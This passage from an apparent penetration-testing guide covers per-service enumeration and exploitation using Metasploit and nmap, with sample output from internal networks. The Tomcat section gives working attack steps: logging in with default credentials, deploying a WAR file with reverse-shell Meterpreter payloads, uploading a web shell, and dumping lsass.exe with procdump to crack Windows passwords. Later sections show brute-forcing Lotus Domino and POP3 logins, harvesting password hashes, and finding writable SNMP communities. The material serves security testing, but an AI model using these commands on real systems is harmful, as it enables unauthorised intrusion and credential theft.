<span class="go">10.87.xx.xx   8080  tcp    http      open   Apache-Coyote/1.1 (401-Basic realm=&quot;Tomcat Manager Application&quot;)</span>
</pre></div>
</div>
<p>We get multiple tomcat manager applications running. Let’s see what we have for Tomcat</p>
<blockquote>
<div><ul class="simple">
<li><p><strong>Tomcat Application Manager Login Utility</strong> which checks for default tomcat username and passwords
using the above module</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/http/tomcat_mgr_login</span>
<span class="go">services -p 8080 -S &quot;Tomcat Manager&quot; -R</span>
</pre></div>
</div>
<p>Run the scan for other ports also above 8443, 80, 1311, 8081 :)</p>
<p>Sample Output:</p>
</div></blockquote>
</div></blockquote>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go"> [-] 10.25.xx.xx:8080 TOMCAT_MGR - LOGIN FAILED: QCC:QLogic66 (Incorrect:)</span>
<span class="go"> [*] Scanned 6 of 7 hosts (85% complete)</span>
<span class="go"> [+] 10.87.xx.xx:8080 - LOGIN SUCCESSFUL: admin:admin</span>
<span class="go"> [+] 10.10.xx.xx:80 - LOGIN SUCCESSFUL: tomcat:tomcat</span>

<span class="go">Yay :) We got two apache tomcat we can upload WAR files and get shell ;)</span>


<span class="go">There are **four ways** (in our knowledge to exploit this)</span>

<span class="go">* Apache Tomcat Manager Application Deployer Authenticated Code Execution (tomcat_mgr_deploy)</span>
<span class="go">* Apache Tomcat Manager Authenticated Upload Code Execution (tomcat_mgr_upload)</span>

<span class="go"> Use either of them to exploit the application by</span>

<span class="go"> .. code-block:: console</span>

<span class="go">   msf &gt; use exploit/multi/http/tomcat_mgr_deploy</span>
<span class="go">   msf exploit(tomcat_mgr_deploy) &gt; show options</span>
<span class="go">   Module options (exploit/multi/http/tomcat_mgr_deploy):</span>
<span class="go">   Name          Current Setting  Required  Description</span>
<span class="go">   ----          ---------------  --------  -----------</span>
<span class="go">   HttpPassword                   no        The password for the specified username</span>
<span class="go">   HttpUsername                   no        The username to authenticate as</span>
<span class="go">   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)</span>
<span class="go">   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]</span>
<span class="go">   RHOST                          yes       The target address</span>
<span class="go">   RPORT         80               yes       The target port (TCP)</span>
<span class="go">   SSL           false            no        Negotiate SSL/TLS for outgoing connections</span>
<span class="go">   VHOST                          no        HTTP server virtual host</span>

<span class="go">   Exploit target:</span>

<span class="go">   Id  Name</span>
<span class="go">   --  ----</span>
<span class="go">   0   Automatic</span>

<span class="go"> set the values required by exploit aad set the suitable payload and exploit. The successful exploitation will give us shell of the victim machine. The payload options can be viewed by using the command</span>

<span class="go"> .. code-block:: console</span>

<span class="go">  show payloads</span>

<span class="go"> The payload options available for this exploit is</span>

<span class="go"> .. code-block:: console</span>

<span class="go">  Compatible Payloads</span>
<span class="go">  ===================</span>
<span class="go">  Name                            Disclosure Date  Rank    Description</span>
<span class="go">  ----                            ---------------  ----    -----------</span>
<span class="go">  generic/custom                                   normal  Custom Payload</span>
<span class="go">  generic/shell_bind_tcp                           normal  Generic Command Shell, Bind TCP Inline</span>
<span class="go">  generic/shell_reverse_tcp                        normal  Generic Command Shell, Reverse TCP Inline</span>
<span class="go">  java/meterpreter/bind_tcp                        normal  Java Meterpreter, Java Bind TCP Stager</span>
<span class="go">  java/meterpreter/reverse_http                    normal  Java Meterpreter, Java Reverse HTTP Stager</span>
<span class="go">  java/meterpreter/reverse_https                   normal  Java Meterpreter, Java Reverse HTTPS Stager</span>
<span class="go">  java/meterpreter/reverse_tcp                     normal  Java Meterpreter, Java Reverse TCP Stager</span>
<span class="go">  java/shell/bind_tcp                              normal  Command Shell, Java Bind TCP Stager</span>
<span class="go">  java/shell/reverse_tcp                           normal  Command Shell, Java Reverse TCP Stager</span>
<span class="go">  java/shell_reverse_tcp                           normal  Java Command Shell, Reverse TCP Inline</span>

<span class="go"> Set the payload option (depending upon the target&#39;s operating system which can be selected by set TARGET &lt;ID&gt;) by using</span>

<span class="go"> .. code-block:: console</span>

<span class="go">   set payload java/meterpreter/reverse_https    -to directly get a meterpreter shell.</span>
<span class="go">   or</span>
<span class="go">   set payload java/shell/reverse_tcp            -to get the system level shell</span>


<span class="go"> Once we have obtained a meterepreter shell we can use getsystem to run the shell with administrative rights,</span>

<span class="go"> Wait, what if the exploitation doesn&#39;t work ? in that case we can exploit the application by another way. :)</span>

<span class="go">* Web-Shell: The exploit which we learned above, uploads or deploys the malicious payload into the application and runs it. sometimes this may not work as it is supposed to be in that case we can directly upload a shell using a WAR file deployment functionality given in the /manager/html page. This WAR file contains nothing but a small code of obtaining a shell called cmd.war file. The code can be downloaded from `Laudanum Shells &lt;https://github.com/jbarcia/Web-Shells/tree/master/laudanum&gt;`_.</span>

<span class="go">  Once you have downloaded the file upload the file to the application. also Download the procdump.exe from `ProcDump &lt;https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx&gt;`_. Copy the procdump file inside the .WAR previously downloaded and upload the modified file to the application. The idea of uploading the procdump with the WAR file is to obtain a lsass.exe process&#39;s dump.</span>

<span class="go"> .. Note :: Lsass.exe (Local security Authority Subsystem Service)  is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. Dumping this process will give us file Lsass.DMP file which can be used to crack the windows machines password in offline with the help of famous mimikatz</span>

<span class="go"> the lsass.exe process dump can be taken by</span>

<span class="go"> .. code-block:: console</span>

<span class="go">   cmd /c &quot;cd C:\&lt;Path to the procdump file&gt; &amp; procdump -acceptula -ma lsass.exe MYdmp.dmp&quot;</span>

<span class="go"> After uploading the WAR file, The system level shell could be obtained by tampering the url http://&lt;IP Address&gt;/manager/cmd.war/cmd.jsp , should directly give us the shell in the page itself</span>

<span class="go">* `Jsp File Browser &lt;http://vonloesch.de/filebrowser.html&gt;`_: Install file browser java server page. This JSP program allows remote web-based file access and manipulation. Able to upload-download, execute commands. Thanks to Tanoy for informing about this.</span>
</pre></div>
</div>
<ul>
<li><p>Searching for <strong>Canon</strong></p>
<p>Found an interesting module <strong>Canon Printer Wireless Configuration Disclosure</strong> which enumerates wireless credentials from Canon printers with a web interface. It has been tested on Canon models: MG3100, MG5300, MG6100, MP495, MX340, MX870, MX890, MX920. We still need to figure out what is Options.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/http/canon_wireless</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[-] 10.23.xx.xx:80 File not found</span>
<span class="go">[+] 10.23.xx.xx:80 Option: </span>
<span class="go">[-] 10.23.xx.xx:80 Could not determine LAN Settings.</span>
</pre></div>
</div>
</li>
</ul>
</section>
<section id="jboss">
<span id="http-jboss"></span><h3>JBoss<a class="headerlink" href="#jboss" title="Link to this heading"></a></h3>
<p>rvrsh3ll has written a blog on <a class="reference external" href="http://www.rvrsh3ll.net/blog/offensive/exploiting-jboss-with-powershell-and-empire/">Exploiting JBoss with Empire and PowerShell</a></p>
</section>
<section id="lotus-domino-httpd">
<span id="http-lotus-domino"></span><h3>Lotus Domino httpd<a class="headerlink" href="#lotus-domino-httpd" title="Link to this heading"></a></h3>
<p>Searching for Lotus Domino we got few modules</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">auxiliary/scanner/lotus/lotus_domino_hashes                               normal     Lotus Domino Password Hash Collector</span>
<span class="go">auxiliary/scanner/lotus/lotus_domino_login                                normal     Lotus Domino Brute Force Utility</span>
<span class="go">auxiliary/scanner/lotus/lotus_domino_version                              normal     Lotus Domino Version</span>
</pre></div>
</div>
<p>Let’s try them one by one</p>
<ul class="simple">
<li><p><strong>Lotus Domino Version</strong> which determines Lotus Domino Server Version by several checks.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/lotus/lotus_domino_version</span>
<span class="go">services -p 80 -S &quot;Lotus&quot; -R</span>
</pre></div>
</div>
<p>Sample output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.10.xx.xx:80 Lotus Domino Base Install Version: [&quot;9.0.0.0&quot;]</span>
</pre></div>
</div>
</div></blockquote>
<p>Let’s try</p>
<ul class="simple">
<li><p><strong>Lotus Domino Login</strong> which is Lotus Domino Authentication Brute Force Utility with our default passwords.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/lotus/lotus_domino_login</span>
<span class="go">services -p 80 -S &quot;Lotus&quot; -R</span>
<span class="go">set USERNAME admin</span>
<span class="go">set PAsSwoRD example@123</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.10.xx.xx:80 LOTUS_DOMINO - [1/1] - Lotus Domino - Trying username:&#39;admin&#39; with password:&#39;example@123&#39;</span>
<span class="go">[+] http://10.10.xx.xx:80 - Lotus Domino - SUCCESSFUL login for &#39;admin&#39; : &#39;example@123</span>
</pre></div>
</div>
<p>Using the above credentials we can use</p>
</div></blockquote>
<ul class="simple">
<li><p><strong>Lotus Domino Password Hash Collector</strong> module to download user hashes.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go"> use auxiliary/scanner/lotus/lotus_domino_hashes</span>
<span class="go"> services -p 80 -S &quot;Lotus&quot; -R</span>
<span class="go"> set NOTES_USER admin</span>
<span class="go"> set NOTES_PASS example@123</span>

<span class="go">Sample Output</span>
</pre></div>
</div>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] http://10.10.xx.xx:80 - Lotus Domino - Trying dump password hashes with given credentials</span>
<span class="go">[+] http://10.10.xx.xx:80 - Lotus Domino - SUCCESSFUL authentication for &#39;admin&#39;</span>
<span class="go">[*] http://10.10.xx.xx:80 - Lotus Domino - Getting password hashes</span>
<span class="go">[+] http://10.10.xx.xx:80 - Lotus Domino - Account Found: nadmin, notesadmin@example.com, (GEo1MDjKxxxxxxxxxxx)(GEo1MDjKxxxxxxxxxxx)</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="iis">
<span id="http-iis"></span><h3>IIS<a class="headerlink" href="#iis" title="Link to this heading"></a></h3>
<p>We can check if WebDAV is enabled on the websites running IIS by <strong>HTTP WebDAV Scanner</strong> which detect webservers with WebDAV enabled.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/http/webdav_scanner</span>
</pre></div>
</div>
<p>Sample Output: Mostly old IIS like 5.1/6.0 would have WebDAV enabled. It is disabled by default in the newer versions.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.87.xx.xx (Microsoft-IIS/5.1) has WEBDAV ENABLED</span>
</pre></div>
</div>
</section>
<section id="vmware-esxi">
<span id="http-vmware-esxi"></span><h3>VMware ESXi<a class="headerlink" href="#vmware-esxi" title="Link to this heading"></a></h3>
<p>Let’s find what version they are running by <strong>VMWare ESX/ESXi Fingerprint Scanner</strong> which accesses the web API interfaces for VMware ESX/ESXi servers and attempts to identify version information for that server.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/vmware/esx_fingerprint</span>
<span class="go">services -p 80 -S VMware</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387</span>
<span class="go">[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387</span>
<span class="go">[*] Scanned  2 of 18 hosts (11% complete)</span>
<span class="go">[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.1.0 build-799733</span>
<span class="go">[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387</span>
<span class="go">[*] Scanned  4 of 18 hosts (22% complete)</span>
<span class="go">[+] 10.10.xx.xx:443 - Identified VMware vCenter Server 6.0.0 build-3339083</span>
<span class="go">[*] Scanned  6 of 18 hosts (33% complete)</span>
<span class="go">[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146</span>
<span class="go">[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.1.0 build-799733</span>
<span class="go">[*] Scanned 17 of 18 hosts (94% complete)</span>
<span class="go">[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.1.0 build-1065491</span>
</pre></div>
</div>
</section>
</section>
<section id="port-88-kerberos">
<span id="kerberos-port-88"></span><h2>Port 88 - Kerberos<a class="headerlink" href="#port-88-kerberos" title="Link to this heading"></a></h2>
<section id="id16">
<h3>Nmap<a class="headerlink" href="#id16" title="Link to this heading"></a></h3>
<section id="krb5-enum-users">
<h4>krb5-enum-users<a class="headerlink" href="#krb5-enum-users" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/krb5-enum-users.html">krb5-enum-users.nse</a> : Discovers valid usernames by brute force querying likely usernames against a Kerberos service. When an invalid username is requested the server will respond using the Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, allowing us to determine that the user name was invalid. Valid user names will illicit either the TGT in a AS-REP response or the error KRB5KDC_ERR_PREAUTH_REQUIRED, signaling that the user is required to perform pre authentication.</p>
<p>The script should work against Active Directory. It needs a valid Kerberos REALM in order to operate.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm=&#39;XX-XXXT&#39;&quot; 10.74.251.24</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-05-23 12:13 IST</span>
<span class="go">Nmap scan report for ecindxxxxx.internal.vxxxxx.com (10.74.251.24)</span>
<span class="go">Host is up (0.0015s latency).</span>
<span class="go">PORT   STATE SERVICE</span>
<span class="go">88/tcp open  kerberos-sec</span>
<span class="go">| krb5-enum-users:</span>
<span class="go">| Discovered Kerberos principals</span>
<span class="go">|_    root@XX-XXXT</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-110-pop3">
<span id="pop3-port-110"></span><h2>Port 110 - POP3<a class="headerlink" href="#port-110-pop3" title="Link to this heading"></a></h2>
<section id="id17">
<h3>Metasploit<a class="headerlink" href="#id17" title="Link to this heading"></a></h3>
<p>Two auxiliary scanner modules</p>
<section id="pop3-banner-grabber">
<h4>POP3 Banner Grabber<a class="headerlink" href="#pop3-banner-grabber" title="Link to this heading"></a></h4>
<p>Banner grabber for pop3</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/pop3/pop3_version</span>
<span class="go">services -p 110 -R -u</span>
</pre></div>
</div>
</section>
<section id="pop3-login-utility">
<h4>POP3 Login Utility<a class="headerlink" href="#pop3-login-utility" title="Link to this heading"></a></h4>
<p>Attempts to authenticate to an POP3 service.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/pop3/pop3_login</span>
<span class="go">services -p 110 -R -u</span>
</pre></div>
</div>
</section>
</section>
<section id="id18">
<h3>Nmap<a class="headerlink" href="#id18" title="Link to this heading"></a></h3>
<p>Two NSEs</p>
<section id="pop3-capabilities">
<h4>POP3-capabilities<a class="headerlink" href="#pop3-capabilities" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/pop3-capabilities.html">pop3-capabilities.nse</a> : Retrieves POP3 email server capabilities.</p>
</section>
<section id="pop3-brute">
<h4>POP3-brute<a class="headerlink" href="#pop3-brute" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/pop3-brute.html">pop3-brute.nse</a> : Tries to log into a POP3 account by guessing usernames and passwords.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -sV --script=pop3-brute xxx.xxx.xxx.xxx</span>
</pre></div>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>While playing one of Vulnhub machines, we figured out that bruteforcing POP3 service is faster than bruteforcing SSH services.</p>
</div>
</section>
</section>
<section id="id19">
<h3>Other<a class="headerlink" href="#id19" title="Link to this heading"></a></h3>
<section id="pop3-commands">
<h4>POP3 Commands<a class="headerlink" href="#pop3-commands" title="Link to this heading"></a></h4>
<p>Once, we are connected to the POP3 Server, we can execute the below commands. Think we got some user credentials, we can read the emails of that user using POP3</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">USER   Your user name for this mail server</span>
<span class="go">PASS   Your password.</span>
<span class="go">QUIT   End your session.</span>
<span class="go">STAT   Number and total size of all messages</span>
<span class="go">LIST   Message# and size of message</span>
<span class="go">RETR message#  Retrieve selected message</span>
<span class="go">DELE message#  Delete selected message</span>
<span class="go">NOOP   No-op. Keeps you connection open.</span>
<span class="go">RSET   Reset the mailbox. Undelete deleted messages.</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-111-rpcinfo">
<span id="rpcinfo-port-111"></span><h2>Port 111 - RPCInfo<a class="headerlink" href="#port-111-rpcinfo" title="Link to this heading"></a></h2>
<section id="id20">
<h3>Metasploit<a class="headerlink" href="#id20" title="Link to this heading"></a></h3>
<section id="nfs-mount-scanner">
<h4>NFS Mount Scanner<a class="headerlink" href="#nfs-mount-scanner" title="Link to this heading"></a></h4>
<p>Check for the nfs mounts using port 111</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/nfs/nfsmount</span>
<span class="go">services -p 111 -u -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] Scanned  24 of 240 hosts (10% complete)</span>
<span class="go">[+] 10.10.xx.xx NFS Export: /data/iso [0.0.0.0/0.0.0.0]</span>
<span class="go">[*] Scanned  48 of 240 hosts (20% complete)</span>
<span class="go">[+] 10.10.xx.xx NFS Export: /DataVolume/Public [*]</span>
<span class="go">[+] 10.10.xx.xx NFS Export: /DataVolume/Download [*]</span>
<span class="go">[+] 10.10.xx.xx NFS Export: /DataVolume/Softshare [*]</span>
<span class="go">[*] Scanned  72 of 240 hosts (30% complete)</span>
<span class="go">[+] 10.10.xx.xx NFS Export: /var/ftp/pub [10.0.0.0/255.255.255.0]</span>
<span class="go">[*] Scanned  96 of 240 hosts (40% complete)</span>
<span class="go">[+] 10.10.xx.xx NFS Export: /common []</span>
</pre></div>
</div>
</section>
</section>
<section id="id21">
<h3>Other<a class="headerlink" href="#id21" title="Link to this heading"></a></h3>
<section id="rpcinfo">
<h4>rpcinfo<a class="headerlink" href="#rpcinfo" title="Link to this heading"></a></h4>
<p>rpcinfo makes an RPC call to an RPC server and reports what it finds</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcinfo -p IP_Address</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcinfo -p 10.7.xx.xx</span>
<span class="go"> program vers proto   port  service</span>
<span class="go">  100000    2   tcp    111  portmapper</span>
<span class="go">  100000    2   udp    111  portmapper</span>
<span class="go">  741824    1   tcp    669</span>
<span class="go">  741824    2   tcp    669</span>
<span class="go">  399929    2   tcp    631</span>
</pre></div>
</div>
<p>The same can be achieved using showmount</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">showmount -a 172.30.xx.xx</span>
<span class="go">All mount points on 172.30.xx.xx:</span>
<span class="go">172.30.xx.xx:/SSSC-LOGS</span>
<span class="go">172.30.xx.xx:/sssclogs</span>
</pre></div>
</div>
<p>Multiple times we have seen msf nfsmount fail because of some error, so it sometimes better to just run a for loop with showmount</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">for i in $(cat /tmp/msf-db-rhosts-20160413-2660-62cf9a);</span>
<span class="go">do</span>
<span class="go">       showmount -a $i &gt;&gt; nfs_111;</span>
<span class="go">done;</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-113-ident">
<span id="ident-port-113"></span><h2>Port 113 - Ident<a class="headerlink" href="#port-113-ident" title="Link to this heading"></a></h2>
<section id="id22">
<h3>Nmap<a class="headerlink" href="#id22" title="Link to this heading"></a></h3>
<section id="auth-owners">
<h4>Auth-owners<a class="headerlink" href="#auth-owners" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/auth-owners.html">auth-owners.nse</a> : Attempts to find the owner of an open TCP port by querying an auth daemon which must also be open on the target system.</p>
</section>
</section>
<section id="id23">
<h3>Other<a class="headerlink" href="#id23" title="Link to this heading"></a></h3>
<section id="ident-user-enum">
<h4>Ident-user-enum<a class="headerlink" href="#ident-user-enum" title="Link to this heading"></a></h4>
<p>If the port ident 113 is open, it might be a good idea to try pentest monkey ident-user-enum Perl Script. The same result is also achieved by</p>
<p>Sample Output</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">perl ident-user-enum.pl 10.10.xx.xx 22 53 111 113 512 513 514 515</span>
<span class="go">ident-user-enum v1.0 (http://pentestmonkey.net/tools/ident-user-enum)</span>

<span class="go">10.10.xx.xx:22         [U2FsdGVkX19U+FaOs8zFI+sBFw5PBF2/hxWdfeblTXM=]</span>
<span class="go">10.10.xx.xx:53         [U2FsdGVkX1+fVazmVwSBwobo05dskDNWG8mogAWzHS8=]</span>
<span class="go">10.10.xx.xx:111        [U2FsdGVkX1+GPhL0rdMggQOQmNzsxtKe+ro+YQ28nTg=]</span>
<span class="go">10.10.xx.xx:113        [U2FsdGVkX1+5f5j9c2qnHFL5XKMcLV7YjUW8LYWN1ac=]</span>
<span class="go">10.10.xx.xx:512        [U2FsdGVkX1+IWVqsWohbUhjr3PAgbkWTaImWIODMUDY=]</span>
<span class="go">10.10.xx.xx:513        [U2FsdGVkX19EEjrVAxj0lX0tTT/FoB3J9BUlfVqN3Qs=]</span>
<span class="go">10.10.xx.xx:514        [U2FsdGVkX18/o1MMaGmcU4ul7kNowuhfBgiplQZ0R5c=]</span>
<span class="go">10.10.xx.xx:515        [U2FsdGVkX1/8ef5wkL05TTMi+skSs65KRGIQB9Z8WnE=]</span>
</pre></div>
</div>
<p>The above are base64 encoded, when decoded results in Salted_Some_Garbage. If anyone know what it’s appreciated.</p>
</section>
</section>
</section>
<section id="nntp-network-news-transfer-protocol">
<h2>NNTP Network News Transfer Protocol<a class="headerlink" href="#nntp-network-news-transfer-protocol" title="Link to this heading"></a></h2>
<p>Network News Transfer Protocol (NNTP), is used for the distribution, inquiry, retrieval, and posting of Netnews articles using a reliable stream-based mechanism.  For news-reading clients, NNTP enables retrieval of news articles that are stored in a central database, giving subscribers the ability to select only those articles they wish to read.</p>
<section id="commands">
<h3>Commands<a class="headerlink" href="#commands" title="Link to this heading"></a></h3>
<section id="capabilities">
<h4>CAPABILITIES<a class="headerlink" href="#capabilities" title="Link to this heading"></a></h4>
<p>CAPABILITIES [keyword] allows a client to determine the capabilities of the server at any given time.</p>
</section>
<section id="mode-reader">
<h4>MODE READER<a class="headerlink" href="#mode-reader" title="Link to this heading"></a></h4>
<p>MODE READER :</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Responses</span>
<span class="go">200    Posting allowed</span>
<span class="go">201    Posting prohibited</span>
<span class="go">502    Reading service permanently unavailable</span>
</pre></div>
</div>
</section>
<section id="quit">
<h4>QUIT<a class="headerlink" href="#quit" title="Link to this heading"></a></h4>
<p>QUIT : to disconnect the session</p>
</section>
<section id="listgroup">
<h4>LISTGROUP<a class="headerlink" href="#listgroup" title="Link to this heading"></a></h4>
<p>LISTGROUP [group [range]] :  The LISTGROUP command selects a newsgroup in the same manner as the GROUP command (see Section 6.1.1) but also provides a list of article numbers in the newsgroup.  If no group is specified, the currently selected newsgroup is used.</p>
</section>
<section id="article">
<h4>ARTICLE<a class="headerlink" href="#article" title="Link to this heading"></a></h4>
<p>ARTICLE message-id   The ARTICLE command selects an article according to the arguments and presents the entire article (that is, the headers, an empty line, and the body, in that order) to the client</p>
</section>
<section id="post">
<h4>POST<a class="headerlink" href="#post" title="Link to this heading"></a></h4>
<p>POST</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[C] POST</span>
<span class="go">[S] 340 Input article; end with &lt;CR-LF&gt;.&lt;CR-LF&gt;</span>
<span class="go">[C] From: &quot;Demo User&quot; &lt;nobody@example.net&gt;</span>
<span class="go">[C] Newsgroups: misc.test</span>
<span class="go">[C] Subject: I am just a test article</span>
<span class="go">[C] Organization: An Example Net</span>
<span class="go">[C]</span>
<span class="go">[C] This is just a test article.</span>
<span class="go">[C] .</span>
<span class="go">[S] 240 Article received OK</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="netbios">
<span id="id24"></span><h2>NetBios<a class="headerlink" href="#netbios" title="Link to this heading"></a></h2>
<section id="id25">
<h3>Nmap<a class="headerlink" href="#id25" title="Link to this heading"></a></h3>
<section id="broadcast-netbios-master-browser">
<h4>broadcast-netbios-master-browser<a class="headerlink" href="#broadcast-netbios-master-browser" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/broadcast-netbios-master-browser.html">broadcast-netbios-master-browser.nse</a>  : Attempts to discover master browsers and the domains they manage.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script=broadcast-netbios-master-browser</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-05-03 21:31 IST</span>
<span class="go">Pre-scan script results:</span>
<span class="go">| broadcast-netbios-master-browser:</span>
<span class="go">| ip             server      domain</span>
<span class="go">| 192.168.xx.xx  FILESRV     WORKGROUP</span>
<span class="go">\|_192.168.xx.xx  XXXXCJ-NAS  VOLUME</span>
<span class="go">WARNING: No targets were specified, so 0 hosts scanned.</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-161-snmp">
<span id="snmp-port-161"></span><h2>Port 161 - SNMP<a class="headerlink" href="#port-161-snmp" title="Link to this heading"></a></h2>
<section id="id26">
<h3>Metasploit<a class="headerlink" href="#id26" title="Link to this heading"></a></h3>
<section id="snmp-community-scanner">
<h4>SNMP Community Scanner<a class="headerlink" href="#snmp-community-scanner" title="Link to this heading"></a></h4>
<p>Find the machines which are having default communtites by using SNMP Community Scanner.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/snmp/snmp_login</span>
<span class="go">services -p 161 -u -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.4.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Cisco IOS Software, C1130 Software (C1130-K9W7-M), Version 12.4(10b)JA, RELEASE SOFTWARE (fc2)</span>
<span class="go">Technical Support: http://www.cisco.com/techsupport</span>
<span class="go">Copyright (c) 1986-2007 by Cisco Systems, Inc.</span>
<span class="go">Compiled Wed 24-Oct-07 15:17 by prod_rel_team</span>
<span class="go">[*] Scanned 12 of 58 hosts (20% complete)</span>
<span class="go">[*] Scanned 18 of 58 hosts (31% complete)</span>
<span class="go">[+] 10.10.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006</span>
<span class="go">[+] 10.10.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006</span>
<span class="go">[*] Scanned 24 of 58 hosts (41% complete)</span>
<span class="go">[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009</span>
<span class="go">[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009</span>
<span class="go">[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009</span>
<span class="go">[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009</span>
<span class="go">[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009</span>
<span class="go">[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009</span>
<span class="go">[*] Scanned 29 of 58 hosts (50% complete)</span>
<span class="go">[*] Scanned 35 of 58 hosts (60% complete)</span>
<span class="go">[*] Scanned 41 of 58 hosts (70% complete)</span>
<span class="go">[*] Scanned 47 of 58 hosts (81% complete)</span>
<span class="go">[+] 10.25.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006</span>
</pre></div>
</div>
</section>
<section id="snmp-enumeration-module">
